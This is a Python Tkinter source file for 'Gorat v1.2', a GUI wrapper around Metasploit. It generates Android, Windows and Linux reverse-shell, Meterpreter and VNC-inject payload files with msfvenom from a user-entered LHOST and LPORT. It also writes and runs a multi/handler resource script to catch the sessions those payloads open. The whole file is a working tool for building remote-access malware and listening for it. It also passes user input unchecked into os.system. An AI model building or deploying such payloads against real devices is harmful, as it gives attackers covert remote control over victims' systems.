import os
import random
import sys
from tkinter import *
from tkinter import messagebox
import distro

class GoratApp:
    def __init__(self, root):  # Corrected __init__ method
        self.root = root
        self.root.title("Gorat v1.2")
        self.root.geometry("600x400")
        self.create_main_menu()

    def create_main_menu(self):
        self.clear_frame()

        title = Label(self.root, text="Gorat v1.2", font=("Helvetica", 16))
        title.pack(pady=20)

        subtitle = Label(self.root, text="Payload generator for Metasploit", font=("Helvetica", 12))
        subtitle.pack(pady=10)

        Button(self.root, text="Create a payload", command=self.create_payload_menu).pack(pady=10)
        Button(self.root, text="Start listener", command=self.start_listener_menu).pack(pady=10)
        Button(self.root, text="Launch Metasploit", command=self.launch_metasploit).pack(pady=10)
        Button(self.root, text="Exit", command=self.root.quit).pack(pady=10)

    def create_payload_menu(self):
        self.clear_frame()
        Label(self.root, text="Select Operating System", font=("Helvetica", 14)).pack(pady=10)

        Button(self.root, text="Android", command=lambda: self.select_payload("android")).pack(pady=5)
        Button(self.root, text="Windows", command=lambda: self.select_payload("windows")).pack(pady=5)
        Button(self.root, text="Linux", command=lambda: self.select_payload("linux")).pack(pady=5)
        Button(self.root, text="Back to Main Menu", command=self.create_main_menu).pack(pady=10)

    def start_listener_menu(self):
        self.clear_frame()
        Label(self.root, text="Select Operating System", font=("Helvetica", 14)).pack(pady=10)

        Button(self.root, text="Android", command=lambda: self.select_listener("android")).pack(pady=5)
        Button(self.root, text="Windows", command=lambda: self.select_listener("windows")).pack(pady=5)
        Button(self.root, text="Linux", command=lambda: self.select_listener("linux")).pack(pady=5)
        Button(self.root, text="Back to Main Menu", command=self.create_main_menu).pack(pady=10)

    def select_payload(self, osname):
        self.clear_frame()
        Label(self.root, text=f"Select Payload for {osname.capitalize()}", font=("Helvetica", 14)).pack(pady=10)

        payloads = {
            "android": ["android/meterpreter/reverse_tcp"],
            "windows": [
                "windows/meterpreter/reverse_tcp",
                "windows/x64/meterpreter/reverse_tcp",
                "windows/vncinject/reverse_tcp",
                "windows/x64/vncinject/reverse_tcp",
                "windows/shell/reverse_tcp",
                "windows/x64/shell/reverse_tcp",
                "windows/powershell_reverse_tcp",
                "windows/x64/powershell_reverse_tcp",
            ],
            "linux": [
                "linux/x86/meterpreter/reverse_tcp",
                "linux/x64/meterpreter/reverse_tcp",
                "linux/x86/shell/reverse_tcp",
                "linux/x64/shell/reverse_tcp",
            ]
        }

        for payload in payloads[osname]:
            Button(self.root, text=payload, command=lambda p=payload: self.generate_payload(osname, p)).pack(pady=5)

        Button(self.root, text="Back to OS Selection", command=self.create_payload_menu).pack(pady=10)

    def generate_payload(self, osname, payload):
        self.clear_frame()

        Label(self.root, text="Enter LHOST and LPORT", font=("Helvetica", 14)).pack(pady=10)

        Label(self.root, text="LHOST:").pack(pady=5)
        lhost_entry = Entry(self.root)
        lhost_entry.pack(pady=5)

        Label(self.root, text="LPORT:").pack(pady=5)
        lport_entry = Entry(self.root)
        lport_entry.pack(pady=5)

        Button(self.root, text="Generate Payload", command=lambda: self.create_payload_file(osname, payload, lhost_entry.get(), lport_entry.get())).pack(pady=20)
        Button(self.root, text="Back to Payload Selection", command=lambda: self.select_payload(osname)).pack(pady=10)

    def create_payload_file(self, osname, payload, lhost, lport):
        ext = ".apk" if osname == "android" else ".exe" if osname == "windows" else ".elf"
        filename = f"{osname}_{random.randint(1, 99)}{ext}"
        command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} R > payload/{filename}"

        os.system(command)
        messagebox.showinfo("Success", f"Payload saved as {filename} in 'payload' folder")

        self.create_payload_menu()

    def select_listener(self, osname):
        self.clear_frame()
        Label(self.root, text=f"Select Payload for Listener ({osname.capitalize()})", font=("Helvetica", 14)).pack(pady=10)

        payloads = {
            "android": ["android/meterpreter/reverse_tcp"],
            "windows": [
                "windows/meterpreter/reverse_tcp",
                "windows/x64/meterpreter/reverse_tcp",
                "windows/vncinject/reverse_tcp",
                "windows/x64/vncinject/reverse_tcp",
                "windows/shell/reverse_tcp",
                "windows/x64/shell/reverse_tcp",
                "windows/powershell_reverse_tcp",
                "windows/x64/powershell_reverse_tcp",
            ],
            "linux": [
                "linux/x86/meterpreter/reverse_tcp",
                "linux/x64/meterpreter/reverse_tcp",
                "linux/x86/shell/reverse_tcp",
                "linux/x64/shell/reverse_tcp",
            ]
        }

        for payload in payloads[osname]:
            Button(self.root, text=payload, command=lambda p=payload: self.start_listener(p)).pack(pady=5)

        Button(self.root, text="Back to Listener Menu", command=self.start_listener_menu).pack(pady=10)

    def start_listener(self, payload):
        self.clear_frame()

        Label(self.root, text="Enter LHOST and LPORT", font=("Helvetica", 14)).pack(pady=10)

        Label(self.root, text="LHOST:").pack(pady=5)
        lhost_entry = Entry(self.root)
        lhost_entry.pack(pady=5)

        Label(self.root, text="LPORT:").pack(pady=5)
        lport_entry = Entry(self.root)
        lport_entry.pack(pady=5)

        Button(self.root, text="Start Listener", command=lambda: self.create_listener_file(payload, lhost_entry.get(), lport_entry.get())).pack(pady=20)
        Button(self.root, text="Back to Listener Selection", command=lambda: self.select_listener("")).pack(pady=10)

    def create_listener_file(self, payload, lhost, lport):
        filename = "msh.rc"
        with open(filename, "w") as f:
            f.write(f"use exploit/multi/handler\n")
            f.write(f"set PAYLOAD {payload}\n")
            f.write(f"set LHOST {lhost}\n")
            f.write(f"set LPORT {lport}\n")
            f.write(f"set ExitOnSession false\n")
            f.write(f"exploit -j -z\n")

        os.system(f"msfconsole -r {filename}")
        os.remove(filename)
        self.start_listener_menu()

    def launch_metasploit(self):
        os.system("msfconsole")

    def clear_frame(self):
        for widget in self.root.winfo_children():
            widget.destroy()

if __name__ == "__main__":  # Corrected __main__ check
    root = Tk()
    app = GoratApp(root)
    root.mainloop()
